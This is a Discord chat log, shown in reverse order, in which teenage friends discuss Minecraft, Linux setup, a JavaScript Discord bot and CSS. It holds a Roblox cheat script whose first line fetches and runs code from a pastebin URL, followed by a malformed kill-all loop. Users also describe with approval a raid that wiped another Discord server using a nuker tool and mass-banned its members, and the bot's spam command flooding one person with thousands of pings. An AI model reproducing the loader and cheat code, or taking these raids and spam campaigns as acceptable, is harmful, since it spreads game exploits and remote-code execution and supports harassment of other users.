its a window with a button


but weird ass syntax


i knew it was a rickroll


windows in python?


i nly have like 5 mods


they count for some reason


idk thats probably the fabric api


python when no indent


terminal python 🤓


I’m in an eye clinic rn


Btw my WiFi is shit


Oh bruh nvm I read “what the fuck” as “wanna duck” 💀💀


YOUR USER DMMED ME SOME PORN WEBSITE


YOU GOT HACKED


<@650439182204010496> YOU GOT HACKED


i didnt want to


my dad forced me ok

i had good teachers for science and english


english is good


science is okay


the math is shit


their math courses are shit


same place i take my math


is print("Hello, World!")


if all we do today for 2 hours


so i just chose python


my mom just wants me to have classes during the summer


every monday and thursday


taking them starting today


<@672892838995820553> i have python classes today


HES FRIENDS WITH CAN


THE REAL YUE

then i joined in again


then the fake yue joined


so i did some trolling


i had yues pfp


i changed my pfp to yues for a bit

LMFAO I JUST NOTICED


dude thats not me 💀


They have better macOS Styled GTKs.


<@650439182204010496> By the way, I might switch to Kubuntu.


remember when fhdbot had copypastas


Then he got salty and threatened to give me a punch in the mouth if I didn't shut up, and I really got hot, and the others did too, and we all beat the shit out of mister conservative. And, after all, he had only himself to be blamed. This is still a free country, And anyone telling a fellow like me, "Brother, you're full of shit", better be good and ready to answer politely when asked if he'd care to say why.


...and politics often make some people lose all perspective and give way to ranting and raving and carrying on like emotional children. They either refuse to discuss it with reason, or else they prefer argumentum ad hominum, which is a hell of a way to conduct a discussion. Well, anyhow, not long ago, I was talking about the elections, and how the campaigns were ignoring the issues, and sticking instead to invective and personal crap that had nothing to do with the substantive problems of running a government, which is all true, as you know if you followed the speeches and so-called debates of the candidates. Anyhow, one of the guys I was talking with said not a word in the whole conversation except at the end when he suddenly chuckled and said we were all full of shit, and why didn't we go live in Russia or China if that was the way we all hated the United States Of America. Next thing you know the whole blooming discussion was more like a brawl, And the epithets flew thick and fast, and the noise was incredible. Someone said "son of a bitch", and I think he said "bastard". I couldn't be sure, it was all so confusing. Well, anyhow, I was attempting to get it all back on a rational level. I tried, for example, to talk to the one who had started it all, and I asked him just what did he mean we were all full of shit. Was he making a statement of fact as he knew it, and where was his documentation to back up his claim? I think Socrates would've been proud of the way I refuted his argument. That is, I tried to refute it, but all he could offer by way of rebuttal was more of the same about how we were all full of shit. But he wouldn't say why, he just kept on repeating it, that and the part about Russia and China and communist dupes, and I'll have to confess that I got a bit angry and told him to stuff his ideas up his ass, which you don't have to tell me is hardly a way to convince anyone in an argument.


i dont have summer school bogo 🤡


TIL Discord uses React


at least thats what i think


but if you boot straight to linux then the sound driver isnt configured


and if you do that then it works on linux


cuz i think windows configures the sound driver on startup


then boot into linux


i have to boot into windows


its to do with my sound driver


<@650439182204010496> i figured out why Linux makes the buzzing sound sometimes

oh ok so


<@593106116821647363> <@672892838995820553> yo


In the focking recycle bin


The current active subscriptions I have are iCloud+ 50GB and Nitro Classic


I think I spent less than 100 bucks so far this year


I bought nitro in 2020


the iPhone was the most expensive tho


iPhone, Apple Watch,


I spent like 1000 bucks last year


I didn’t start spending much till grade 8


Got my bank account late into gr5


I think I bought mc in late 2017


I got my bank acc sometime in late 2017 I think so


2015-2016 - wanting to play minecraft
2016 - moved to Ontario, got my pc, trying to get free minecraft
2016-2017 - played some Minecraft with Alt Token accounts
2018 - bought minecraft


My mc story goes something like this


Always dreaming of playing actual Mc


I always played paper minecraft on scratch and shit


That was when I was still in Quebec


I’ve been wanting to play since like


First version of mc I ever played was 1.12 btw


Minecraft ran at like 20-30fps


It actually ran fine


A 2010 Acer laptop that used to be my dads


My first was grade 4


When did you get ur first pc


That never worked


(Most of it for free minecraft)


I already installed lots of spyware on my pc


Grade 4 me


Ppl turn 10/11


Grade 5 is a good age


That’s when ppl start using devices


They should be teaching about computer safety and shit in grade 5 tbh


This is why technological understanding should be taught in schools


My friends have been a lot :/


I’ve never been hacked in my life


Yeah do that


What antivirus does he use


Just do another scan


Scan his pc both with an antivirus and manually


Must be a program


Well then do the other 2 steps ig


And remove every suspicious program on the PC


That’s what I would do


Check the email used for his discord account on https://haveibeenpwned.com


Change your password


Dm all the ppl “sorry someone hacked my account”


Does he have the DMs in his dm list?


What was the hack about


What exactly happened


He said something about crypto


What happened exactly


The most basic way


Change their password


I hate the library


Ubuntu variant users 🤓


Can confirm arch users are femboys


Never tried it tho 😎


Didn’t react for a solid minute and I think I pissed him off cuz he just went away


I went to my mom and said “blah blah blah” and an old pedo looking ass old man heard that and then went to me tried to get my attention by just repeating “bluh bluh bluh”


My dad forcing me to read tho


If I wanted to read about Linux I’d just doomscroll the Linux documentation


I got a Linux book and a web design book 💀


Currently at a library brb


Does he not have 2FA?


How did he get hacked


Yeah I know but


Like last time


It’s gonna be Me Neng and daiwik again


I’m actually gonna fully disable Wurst for the next speed run


Survival mode we stay normal


Only during creative mode


We haven’t played on it in weeks


Oh the OG survival server that u played on?


After the speed run  ended yes


I’m reporting@you to discord


Then you did it


I’m saying he did it


wait i didnt commit


new blog post btw


too much sand


i also crashed the server again


<@593106116821647363> <@672892838995820553> tf r u guys


2nddeity fling moment

on the next one


and no commands


this world shall be saved


and make a new world


we save this world


so we just try to get under that


but weith the time after we beat it


this was our best score


just try to get a better score


and without yue typing any commands


with the settings of a normal singleplayer world


without any settings changes


we should actually make another speedrun world


why did you turn on autorespawn


- we all get in
- we all attempt to get to our positions
- we all die
- we all get our stuff
- neng leaves
- ender dragon's AI breaks
- we wait for like 30 minutes but we never noticed
- we shot the ender dragon to less than half health
- we restarted the server
- the youtube video i posted


let me put the timeline


the ender dragon


then we restarted the server


lost all our arrows


so we shot him to less than half health


not going down


just flying in the same pattern


it kept flying around the place


the ender dragon's AI broke


when neng left


a few minutes in


midway during the battle


neng had all the fucking arrows


we had to suffer through heavy item loss


he went back and took his stuff


what he did


since we're done now\


<@650439182204010496> can you give me op on the server


He had to go


WE DID IT


(aka all our diamond stuff)


and a HEAVY LOSS OF ARTILERY


AFTER 5 ISH DEATHS


WE FUCKING DID IT


CAN U HEAR ME


<@650439182204010496> COMEBACK HERE


<@593106116821647363> TORH KSPHKRTH


<@593106116821647363> we're waiting for you


neng is back

killaura on a roblox game and a GUI

```lua
loadstring(game:HttpGet(('https://pastebin.com/raw/FyNKUMc4'),true))()

while true do
wait(0.3) -- don't change this

-- finding the characters
for i, v in pairs(game.Workspace:GetChildren()) do

       if v:FindFirstChild("Humanoid") then
           
           -- team check
           local victimplayers = game.Players:GetPlayerFromCharacter(v)
           if victimplayers.TeamColor ~= game.Players.LocalPlayer.TeamColor then
           
           -- killing everyone
           local Event = game:GetService("ReplicatedStorage").Event
           Event:FireServer(

            "",
           {
           v.Head
           }

           v.Humanoid
   
        }
   
)
end
end
end
end
end
```


im gonna play later


im bored now


MY ALT GOT BANNED


<@593106116821647363> r u online


My Morbius sword broke 😔


Daiwik already found a few diamonds


<@672892838995820553> btw, the mine with lots of diamonds and endermen is in the library (which is also where the enchantment table is)


HAPPY CANADA DAY


<@593106116821647363> <@672892838995820553> <@650439182204010496> portal update


i got 3 POTIONS AND THEYRE HELLA RARER THAN PEARLS


SPOT THE ENDER PEARLS


I JUST BARTERED 30 INGOTS


lemme get my mukbang hands clean


i love hacks


lemme get on linux rn


and press enter


remove the usb


show me the entire message


i doubt you have one


cdrom is like the disc slot


you dont have a cdrom anyways


u have tonnect


u can also join vc from there


then just go on discord and share ur screen


<@593106116821647363> open firefox


OH THATS TRUE


choose keyboard layouit


press install linux mint


lets just wait


ITS WORKING I THINK


ok anyways yeah


<@650439182204010496> did you do the highscore command


the highscore isnt


to go down 1 level


so you want to use arrow key


is a safe graphics option


but the 2nd option


the thing you selected was Install Linux Mint


thats where you boot Linux


it's called GNU GRUB


the black and white menu


X means dont change


this is what ur supposed to do


did you click on any of the settings in Rufus


well thats the source i used when i downloaded mine


the disc image file of Linux Mint


where did you download the ISO


cuz that is not supposed to happen


i dont think you installed it correctly


do those steps again another time


turn it on


yeah thts good


turn it back on


then when it turns all the way off


just hold your power button


wtf is that flashing


cuz u were supposed to press enter when GRUB was still on the screen


did you press enter when the screen was gone


what did you


enter first option


then press enter


use down arrow key until you hitnthe Sony storage


can you hear us


its still not there


theres no usb input


its so blurry


i havent seen before


oh shit this is a new bios


click on that


we'll talk here


what u haver to do


and well just say


just show ur camera


join with phone then


then take a pic of what it looks like after you restart


meanwhile partitioning manually is like a 20% chance


by extremely low i mean like 0.5%


extremely low data loss chance anyways


get on ur phone after this


just shift click restart


that too i guess


go to windows updat


go to settings


ok so do you know how to boot to your BIOS


do you have mint installed


do you have mint on ur usb


do you have mint on ur usb slot


choose INSTALL ALONGSIDE WINDOWS BOOT MANAGER


set it up like you would on windows


compared to setting up the partitions yourself


so the risk of losing ur data is extremely low


mint doesnt need manual partition management


why are you backing up


me when github can't read files correctly:


<@672892838995820553> can you move me to member count


why do i hear someone talking


your mom or your dad


well i can start the other server


that'd prob break like 20 picks


this isnt individual


our goal currently is nether


but you havent been to the nether


@everyone <@788945775446065162> loves men


imagine having a job 💀


because being mean is FUHNY


THESE PPL NEED TO GET BANEND FROM HERE


with rgb lights


and face revealed

AND THE INVITE IS INVALID


YUE GOT RID OF THE DISCORD EMBED


I like Wendy’s


I thought he went to China 💀


Where tf are you that 8AM here is 4PM there


tomorrows another day of debugging


.8ball is <@845361227093508116> fat???


.8ball am i dumb


.ship your mom


.shi pyour mom


.shi ptour mom


.ship a b


.ship 1 the


something to do wtih the commands


in the messageCreate event in the main file


i do module.exports right


when im importing a fikle


const ... = REQUIRE(...)
const ... = REQUIRE(...)
const ... = REQUIRE(...)
const ... = REQUIRE(...)
const ... = REQUIRE(...)
const ... = REQUIRE(...)
const ... = REQUIRE(...)
const ... = REQUIRE(...)
const ... = REQUIRE(...)
const ... = REQUIRE(...)
const ... = REQUIRE(...)


so in my case


IMPORT ...
IMPORT ...
IMPORT ...
IMPORT ...
IMPORT ...
IMPORT ...
IMPORT ...
IMPORT ...


that can read


how do i make a command handler


withj all the help commans


i just want help.js


cuz i dont want OWNERHELP.JS AND STACKHELP.JS


how to have multiple commands on a file


cuz the way its written is different from other commands


tl;dr moving all commands to seperate files, problem with countries guessing


correction* COMMAND HANDLERS??


this time with bigger letters


i need another anthonyhuang07.github.io remake


gonna play more roblox


```js
    const ship = args[0]+args[1]
    function shipcharcode(array){
        let total = 1
        for(let i = 0, l = array.length; i < l; i++){
            let adder = array.charCodeAt(i)
            total += adder
        }
        return total;
    }
    let percentage = shipcharcode(ship)%101
```


.ship England WorldCup


.ship EnglishPeople Football


HOW IS THAT POSSIBLE?


EVERYONE ON THE PLANE DIED?


shoulda said AMD FSR


ok im gonna make a new game now


i just got a bunch of random assets


i dont think i wrote this though actually


9 year old me


i remember When I Typed Like This For Everything Because I Thought It Looked Cleaner.


10 year old me 💀


cmd still dont work lmfao


what is FSR?


thats why chromeos sucks


Mint has different choices of DEs but beginner DE is Cinnamon (which is awesome)


Ubuntu’s default DE is gnome (which absolutely sucks)


Just ping me


I’m on my phone


I turned off my@pc


k bots gonna go offline now


thats why its broken


about and shit aren't done moving


went into some issues along the way


since all the commands were stored on 1 file (which isn't good) i finally decided to use multiple files


i have to head to bed


ykw ill deal with this tmrw


uptime is  not defined


bruh the embed is nonexistent


why do u think its called FHDBot


couldn't get country guessing/stacking countries to work


i was changing from 1 file to multiple command files today


<@737884498271928320> its broken


u guys are actual negi


mans gone 💀


<@650439182204010496> time this guy out]


okay how about


okay lets try your method


thats not how it works


if its outside `exports.run` guess what will happen


wait that wouldnt work tho


it it supposed to be outside the `exports.run`


how tf does it become global in


its ignoring the `    if(guessingCountry) {`


messagecreate is the event


now it wont detect input


i put the code in the seperate command


<@650439182204010496> problem here


fuck you fhdbot


no fucking way bro


.ship Anthony porn


.ship Daiwik porn


.ship Daiwik Porn


.ship Mazin porn


.ship Yue porn


.ship Neng porn


.ship FUCK YOU!


.ship your mom


.ship a b


stack the countries by murding children 😎


IT WAS ARGS.SHIFT


the command doesnt wanna work


like it runs fine but


my thing wont work


cmd is undefined


because that line of code


time to delete my entire bot


config is not defined


MY NAMING SCHEME WAS JUST DESTROYING EACHOTHER


set is undefined


Uncaught TypeError TypeError: Cannot read properties of undefined (reading 'set')


you change it


with copypasting code


this is the problem


oh my god


it worked but


YOU ONLY DO THAT FOR 1 LINE


ok it worked


yet it says it doesnt exist


theres literally an events folder


he hit my alt with 1k


i hit yue with 40k pings once


we do it all the time


if ur not gonna do it


you're being crude and rude


he uses Kubuntu


ok fatscript still doesnt exist


the language of the dark web™️*


*makes the logo nsfw*


i looked at the word command too much and now it looks weird


i have no idea wtf this does


cuz u dont


whatever that is


i have to use fs


you may not be able to type stuff but its still dynamically typed


funniest shit ive read today


"JS doesn't have types"


i dont need this?


this makes no sesne


```ts
import Discord from "discord.js"

type CommandHandler = (context: Discord.Message, commandArguments: string) => void

export default CommandHandler
```


yo fhdbot u good


noone commits .vscode


why did you not ignore .vscode


u used es modules


did u do this?


`import . from .`


im still using commonjs


you used ES modules right


all i know is `module.exports`


<@650439182204010496> how to make a command handler?


im gonna make my commands


im gonna do it


theres no way


you cannot win


literally trash kiddo


there we go


just organized my global variables


it goes orange


when i run FHDBot


it dont wokr


<@650439182204010496> it doesnt work


lemme fix tha't


.vscode wasnt within the folder


i only need this


{
            "name": "Launch Program",
            "program": "${workspaceFolder}/fhdbot.js",
            "request": "launch",
            "skipFiles": [
                "<node_internals>/**"
            ],
            "type": "node"
        }


i have all this


i already have launch.json


dont work for me


you spammed after i left


it returned as null


and since raku didnt share mutual servers with the user


because i left the server


actually its typescript 🤓


the entire time


you got trolled


i figured out what null meant which means im smarter than all of u


because he got trolled


did you disable


ur missing one


<@650439182204010496> did you disable invites???


<@672892838995820553> ur so fucking funny


i never noticed


after he spammed me


because i rejoined the server


it did successfully spam me


as you can see


<a:trolla:842081333127675952> <a:trolla:842081333127675952> <a:trolla:842081333127675952> <a:trolla:842081333127675952> <a:trolla:842081333127675952> <a:trolla:842081333127675952> <a:trolla:842081333127675952> <a:trolla:842081333127675952>

also that alt was me


so it was null


left the server


null = no value


its not a name


think of another use of the word


spamming null.'s dms lmfao


it would be


if it was actually spamming null


its missing a period


it's missing something


what's null's name


<@650439182204010496> u wanna know why it said Null?


is not null

Although the phrase is nonsense, it does have a long history. The phrase has been used for several centuries by typographers to show the most distinctive features of their fonts. It is used because the letters involved and the letter spacing in those combinations reveal, at their best, the weight, design, and other important features of the typeface.

<@845361227093508116> why do you want to learn the hell language as your first lang


so the cooldowns are useless


and error because it makes no sense


so the messages from the other channels register into the json


because messages from other channels come in right as the answer comes in


<@650439182204010496> i found the reason why the json wipes out during a new record


im bored who wants to see me exploit in roblox


im gonna make an anvil


trampoline park in oavkile


lets fucking go


i did it


you have to use a smithing table


you dont use 3 ingots and sticks


thats literally how you make netherite stuff


ha ha ha he


Im making a netherite pik


1 NETHERITE INGOT


i think i can make 1 ingot


i only take damage cuz i get fire'd


tnt will destroy them


cuz beds don't do damage if you have those blocks


plus tnt = more of a chance of death


beds are easy


its more expensive tho


oh im down to my last bed


i almost died again


as you can see


(i dont have which is how i died)


also get fire resistance


sleep on the bed and let the magic happen


just stripmine, then place a bed,  place 2 blocks (more durable is better)


learned from another mc server


its classic strategy


i still have more beds


I GOT 2


WHY IS IT JUST APPEARING RANDOMLY


it was only a 1 vein tho


THERES NO WAY


THERES NO WAY


why hard mode smh


IT STILL HERE


behold the ultimate ammunition sasquatch


hard mode moment


im gonna grind sheep


attempt 4 (final attempt): no netherite <a:waaaaaa:978757388565905488>


attempt 3: no netherite


attempt 2: no nerhterite


attempt 1: no nertherite


GOd the server is lagging bad


i should bedmine


welp im going to find netherite now


then a piglin from a portal killed me


then another spider zombie and skeleton showed up


i killed all of them


and there were 4 coming at me


zombies can break does


<@650439182204010496> why the fuck is the server on hard mode


and i'd probably die biking there


yeah uh i cant drive


i dont have a pool


tis slow today


its still loading


turns out there was a recent wildfire in spain cuz of the heatwave


they have one in windsor?


thanks global warming


the entire world is having a heatwave


aternos is located in europe


total server K.O.


THATS WHY THERES A QUEUE


CRASHED THE SERVERS


ill play mc now


itll get lost


make an idea list channel


they just use plain javascript


ok i checked the codecademy code editor


unless your iq is 150


to make a html editor


who all know fluent JS


a team of 10 programmers


you need like


ok idk where to even start with an html editor


features:
- be able to write csa


$19.99 a month


and we can have a premium feature


vector to svg hell yeah


i acn make the icons for sure


what logos tho


also im not adding you to the website till you make a contribution


i cant find it tho


i also made a logo for an app idea kickstarter pitch for an english project


there was no use tracing that anyways


except for the windows defender icon


all of the images are traced with vector pencil™️


i made this for a grade 8 science project in illustrator tho


i cant draw but i sure can trace and photoshop


wtf are we doing again


we save it for future


this idea is too complicated anyways


yeah but scratch isnt mobile compatible


the app is gonna use to use apps


the website is used to make apps


theres also gonna be a mobile app to use those apps


imma make a figma sketch


people can still make games


login systems and everything


very cool i know!!!!1


you make apps


but instead of making animations and games


make a scratch-like website


when i was biking the other day


i had this GeNiUs startup idea


search engines are hard


my parents arent home so i can scream as loud as i can


how about a css preprocessor (i have no idea how to use one)


we can make a superset of html


a html editor


will we make


i did bozo


that had the contract


so my sign record is gone


purged the chat


you guys at one point


lemme find it


he has it


use a seperate html eidtor


i thought u meant like


i didnt see


sign the contract


a html editor


whats the projedct plan again


just stick to vscode as always


oh <@650439182204010496> did it finish indexing


speaking of css


i need to learn more css


its kinda confusing


i was messing around with tailwind yesterday


but vscode superior


i could use that


i mean i have Adobe Dreamweaver?


(you can also edit the box model)


i always go to edge for some reason


but i mostly use edge so


cuz they look awesome


i should really


something called ~devtools~


wdym html editor


not human level though


i mean they probably can


its like a bot can give UX insights 🤣


thats when they report to us


they dont like


if the thing is broken


they dont like


if the UX is bad


they're the end users


a tester is like a client


and i told you he doesnt know any languages


to use those


pretty sure you'd have to know C, Py and


messing around with a program


thats also a title


since you dont know any languages you can only test


<@845361227093508116> we can make you an employee but the only title we can give you is code tester


or if you wanna rot your brain


learn something like Java


but learning python is not valuable considering we already have python devs


then u need pro


if you wanna learn python


thats for codecademy pro dumbas


no you dont


get 50% on any course and we'll consider


thank me later


ik how you can become one


ur not an employee tho


oh and btw


gonna add when i gtg


we were at 20372 pings last time


make it more co

i alrady did


oh that'd suck


.spam 650439182204010496 hi if you're reading this please tell me how many pings i've reached thanks


so i banned him from the leaderboard


so it's his problem


i tried getting a new highscor and i didnt crash it


because he kept getting a new highscore


you see the guy from ot crashed my bot again


i forgot to start spamming again


the shape was


except for the image


the kotlin css was made with 100% css


ok im not rate limited


.spam 650439182204010496 hi if you're reading this please tell me how many pings i've reached thanks


bruh i forgor


.spam 650439182204010496 hi if you're reading this please tell me how many pings i've reached thanks


#1 - 12650


thanks to someone in the Ot server


(bot crashed btw)


lets see how many pings we get


im spamming him the entire summer


im gonna stick with vanilla css for now


tailwind too hard


i tried using tailwindcss and epic failed 💀


so we're just the peasant testers


i barely know any C in the first place


why would i bruh


how would me and neng contribute


i know but


how would scp engine development work tho


chess and scp engine?


im gonna commit now


thre we go


did you even enable it


an invite channel


you have to send


i think the iframe


web ftw !11


its in widget


lemme go on my server


its in server settings


ill get it myself


just give me perms or some shit


make nengos 😱


i havent got to pointers and memory control yet


<@650439182204010496> SEND THE IFRAME


learning C! 💀


how would python be used


but for now not interested


ill look into it if i do


unless we get taught cpp in computer science in the near future


im not gonna be writing low level program anytime


cpp isnt worth learning for me


not what we use to make the stuff


c++/c is used to make the stuff we use to make the stuff


slow development time 🤣


with extra steps


fullstack is pretty much web dev


low level programer is not necessary


you don't need cpp


unless youre literally programming the servers that you're running your thing on then


like webdev needs memory management


Well technically backend but i don't think it would be that useful


defo not php tho


another language for extra


cuz node easy with js stuff


i want node + another language


idk really which to learn for backend


1. frontend (HTML, CSS, JS + tools)
2. backend (Node.js/PHP/RubyOnRails/ASP.NET/Java/Python)
3. database (mysql, mongo, postgres)
4. devops (AWS, Azure, NGINX, Docker, VMWare, Kubernetes)


ok this is the real full stack sandwich


that's about it


theres also app development


js+angular+react+vue+anything to be javascript better


css+sass+bootstrap+anything to make css better


front end is just


its pretty much it


idk how to describe aws


dude im just


1. frontend (HTML, CSS, JS, React, Angular)
2. APIs (REST, Soap)
3. database (postgre,, mysql, etc.)
4. backend (python, .net, node.js, mongo)
5. web server (AWS, google cloud)


front end is literally half of full stack


its mostly just


full stack dev:
- web framework
- database
- html/css


ruby on rails


if you know django


then how r u a full stack 🤣


do you know any js frameworks?


in server settings


<@650439182204010496> can you give me the discord iframe


very not good to work with


why did u use lists for the contacts


i fixed that too


im adding it


cuz idk what else to use


i mean i still use px for images


i think theres only like 2 instances of px on my website


im trying to use less px


and im gonna add a discord embed


i am currently fixing your contacts page code


btw <@650439182204010496> protip: use `em` for text, `rem` for box model stuff


i dont think the css updated


github pages broke itself


ill commit and check it out


im done the index


my requirements were at least 1 blackish color


im using color palette generator for the colors


is what i got


upscaled version of li institution logo


theres a blank


C A N V A


im using the scuffed method


its gonna take like 10 mins to open anyways


idc enough to open photoshop


fuck that piece of shit


20 fucking dollars


<@650439182204010496> the li inst. website background image is off center and hard to work with so im ditching for a solid color


I GOT THE ACHIEVEMENT


now console log is good


there we go


He unblocked mine


merge my pull request


un ban me


SOMEONE BANNED ME


and who has perms

The joke is, that the Sun Microsystems sign used to be facing the sun, but ever since Facebook took over, the Sun Microsystems sign got put on the back of the sign, facing the wall with no **sun.** 🤣🤣🤣🤣🤣🤣🤣🤣🤣🤣


NOT IN THE **SUN** ANYMORE

i went to facebook headquarters back in 2019 and i saw the old Sun Microsystems sign behind the facebook sign 💀


TIL that microsoft owns github


cuz microsoft made typescir


microsoft doesnt own oracle


its from oracle


its not typescript


why would they


- froma  windows user


same with canadian geo in gr9


canadian history is mandatory in gr10


cuz its mandatory


as an elective


if u take world geo


if you kill the file explorer it also kills the taskbar


bc the taskbar is part of explorer.exe


such a windows moment


```
explorer.exe - System Error
------------------------------
(X) The system detected an overrun of a stack-based buffer in this application. This overrun could potentially allow a malicious user to gain control of this application.
------------------------------
[ OK ]
```


explorer.exe auto restarts itself when u press ok


```
explorer.exe - System Error
------------------------------
(X) The system detected an overrun of a stack-based buffer in this application. This overrun could potentially allow a malicious user to gain control of this application.
------------------------------
[ OK ]
```


cuz snipping tool requires windows explorer


i cant even screenshot


when ur clicking on a taskbar icon that is


WHEN YOU DO LEFT CLICK+SIDE CLICK 1 (for gaming mice) IT ERRORS THE WINDOWS EXPLORER


I JUST NOTICED


anyways <@650439182204010496> can u restart the mc server


so -1 each time


the other 4/5 removes a country from the stack


it only has a 1/5 chance of going back to 0


ok lets try this


hes barely active anyways


yes i have been in it for 3 months now


and i saw that


i was looking for Neng in the ot server


THIS IS THE REAL JAY


brentoa in ur dms 💀


no i crashed it by accident


turn on the server


im gona play mc then


oh lol ok


and the `return;` doesnt stop it


then skips by 2


so it starts normal


thats for each second


`19` -> `18` -> `17 16` -> `15 14 13 12` -> `11 10 9 8 7 6` -> `5 4 3 2 1 0 0 0 0`


so lemme make a quick representation of what the timer looks like


<@650439182204010496> WE DID IT


THERE ARE 3 COUNTRIES


IT DIDNT LOAD IT


now lets restart the bot


its still config.highscore


I FORGOR TO CHANGE SOME STUFF


it didnt even write to the json


ok lets do it then


i dont think we should put highscore in config


do we use another json


you know what


its supposed to look like this


if the contents are broken


reloading aint gonna do shit


the json successfully reloaded


WHY DOES THE JSON KEEP DISAPPEARING


the thing gone again


u forgot an extra closing bracket


<@650439182204010496> the same


lets try again


IM A DUMBASS


I ACCIDENTALLY DELETED THE CONTENTS


ok lets restart


the json is the same


to change it


what would let do


the prefix is gone


lets restart the bot


this is the only require thing i have for config


if i did each individual person i would make it in mongo.db


<@650439182204010496> it completely overwrites the json


OH IT WORKED


ok lest ry


do we need the brackets


it would look like


time to do this all over again


does this have to be a string?


hang ona  sec


the error starts here


wtf is that error


looked at the answer


i coulda just


u kidding me


IM  A BOZINO


I CHANGED IT FROM "" TO 0


god fucking dammit


can it not be an object??


received an instance of an object


somethings wrong here


```js
fs.writeFile("config.json", JSON.parse(JSON.stringify(stackedCountries)))
```


<@650439182204010496> ur code is crashing my bot


IT CRASEHD AGAUNN


ykw im doing it too fast


ive never seen ths error before


lets just try this


it didnt work btw


cuz before i did write FileSync


weird to parse


W json tbh


but the problem is writing to the json doesnt work


and it works


thats what im doing


literally just `config.highscore`


which is what
```js
        if(stackedCountries.highscore > config.highscore){
            JSON.parse(JSON.stringify(stackedCountries))
        }
```
is supposed to do


i want the highscore in the json to update


someone gets a new high score


this is the json right


```json
{
    "prefix": ".",
    "ownerid": "628672513345454122",
    "highscore": 0
}
```


what i wanna do it


ok so basically


this is what i wrote


```js
        if(stackedCountries.highscore > config.highscore){
            JSON.parse(JSON.stringify(stackedCountries))
        }
```


didnt work bozo


lemme try that


you tell me 😐


probably because css is making me wanna off myself


mostly on fhdbot


i havent been working on webdev much


this isnt funny


now everything else is gone


i did it wrong


even though i just got 1


this is the object in my json


this is my code


```js
let stackedCountries = {
    stacker: ""
}

if(stackedCountries.stacker > config.highScore){
    fs.writeFileSync('./config.json', JSON.stringify(stackedCountries));
}
```


just write to a json


so it doesnt reset


i want that saved in a json


the highscore for stacking countries


saved to json]


im tryna get values


Instead of choosing it


You can make it choose a random country for the globle


Ur doing globle?

i do not love nengipedia


my all time favorite shade of orange


at least in hexa


and its super easy to memorize


now its my signature color


i chose this orange color


the primary color


but i remembered when i chose the color for my website


time to bust out the good ol photoshop


a main pfp


i dont have like


i really need to make a logo


didnt optimize that yet


i forgot about that


oh shit wait


added a readme on my github lmfao


i forgor how shit it looked


that what my website used to look like


rip hours of work


i also removed the 4k optimiztion cuz that broke a lot of stuff


<@650439182204010496> 1080p screen optimization complete!


footer fixing time


just the mainstream ones are fight


looks goofy on the galaxy fold


not gonna optimize for those cuz noone uses them


except for small screen iphones 💀


it works on almost every mainstream mobile device!


alright so i checked


I DID IT


mc and webdev


really be possible


and around 120 people came back


163 people got banned


we mass banned


and our plan was when he came online


only Can had powers


they had no power


and gave admin to fellow raiders


so we just got rid of everyone's admin


with admin perms we can remove ppl lower


but it was higher than admin


so we removed


unbannable was higher than admin


we got unbannable right


of all people


this is still my favorite image


her other braindead buddies tho 🤡


about the nuke


she didnt give a shit


joanne is probably the most chill


from all of pratha's braindead buddies


the command that caused the mass ban


this was the mass ban


this was from one of our raider's perpective


theyer in my camera roll


i have images


was forgetting to record


one thing i regret


noone talks in them anyways


they hated me for some reason


pratha and her braindead buddies were part of the reason why i wanted to nuke


with like 6 ppl talking


by pretty active i mean


but its deader than what it used to be


well its still pretty active


and the server is deader than ever


members dropped by around 60 ppl


all channels, roles are back


3000 pings = rate limit


i never wrote a discord bot back then so i didnt know how


and i found presser


i was looking for server nukers on github


the nuke was where i found out about presser


yes with Presser


like 100 channels


well not exactly


we hit 2K pings that way


so create 1 channel = 10 pings


then cp = create and ping


deleted every channel


who had admin


we had a person part of our group


here was our plan


i never did


other 60% was pratha's buddies


pratha being there was like 40% of the reason


she didnt even own the server or anything


i hated her


she hated me


basically ever since the woss nuke


and annoying asf


she mid asf


why delete tho


HER LATEST MESAGE


he thinks hes so cool ykyk


anthonys such a gamer yk yh he stays in vc like a gamer yh

Also just noticed I got the Jia character wrong the entire time


WAIT THATS ME!??


But not illegal


i have soccer now anyways


more optimization <a:waaaaaa:978757388565905488>


added 
```css
*{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}
```
and damn does my website look nice


let me see if i can do this


looks okay on ur end


since padding is inside the box


padding cant affect the footer's position


i added margin


but that just


LEMME CHANGE that rq


BECAUSE I HAVE `bottom: -2.2%` FOR SOME REASONN


whats ur monitor resolution


ok im home


But doesn’t matter


Except mine isn’t long


Or literally any other website with a long ass page


It’s like saying “oh I can’t see the footer on GitHub I have to scroll all the way down to see it”


But its fine


No that wasnt my intention


Cuz it’s designed like that


It’s 82px down from the main


…like I said


It’s designed like that


It looks normal


I don’t see anything. Wrong


But the header is showing fully?


It’s designed like that


It’s just like that


Oh wait I get it


Why is it


Ok so it actually looks fine


got damn devtools is hella useful


also maz is literally in <#979014678116180009> and he cant see employ channels 🤡


why arent they allowed in <#977378415755816980>

But MacBooks are manufactured by your people


We get it


Waste of money


Ah yes replace something I’m going to replace anyways


Iirc a year ago I put a piece of paper in it


Cuz it’s impossible for a fan to make that noise naturally


Something is touching it


Cuz there’s definitely something wrong with the fan


Okay I’m taking apart the laptop


And my pc is still loud as fuck on the LOCK SCREEN


And it’s not even saving


I’m trying to take a video on my phone


Are you fucking kidding@me


Literally the perfect place for airflow yet it’s loud as FUCK

```


for what elemnt


what the fuck am i looking at


center looks much better


where would the button me


currently theres left and bottom margin


what would it look like without margin


this is what the button looks like


well it does add


without adding shit


lets you move thing around


which is invisible


then the margin


the yellow part is the padding btw


so its now a larger


but i added padding to make it larger


it would just look like that


now without padding


is the content


which is the text


lets use the example of the button i just made


you can use devtools to check the box model on an element


which gives the entire element more spacing


then 50x30 margin, which is invisible which you cannot see


so theres a size 5 border around the entire thing


is sized 5


then the border


orange is the image


yellow is the padding


then you have 50 padding on top and bottom, 20 on left and right


thats the content


lets say your image was 794x160


content - your text, images, basically any element
padding - filler content to pad out the content, like making a button larger
border - your border: the outline of your element, where padding and content is contained
margin - invisible padding outside of the border


its easy as shit


then we'll talk


go learn that


did you even learn the box model


wdym cover the thing


wtf am i looking at


what the actual fuck is this


before the closing body tag


its supposed to be


in the head


why is your script tag


oh wait it still hasnt deplyoed


nice website bozo


i added the button btw


Anyways gtg bye


I mostly did scratch when I was younger

intel macbook air is a money burner


(bad value macbook air)


the intel macbook air


LOOK AT THAT


TIGHT TIGHT TIGHT


and thats the intel macbook air 🤮


thats the 2nd top


and top result when u search m2 macbook air


when u search macbook air


its one of the top results


the gif is finally searchable


shut the fuck up


that does not look like a dick


any more space


barely anhy more spce


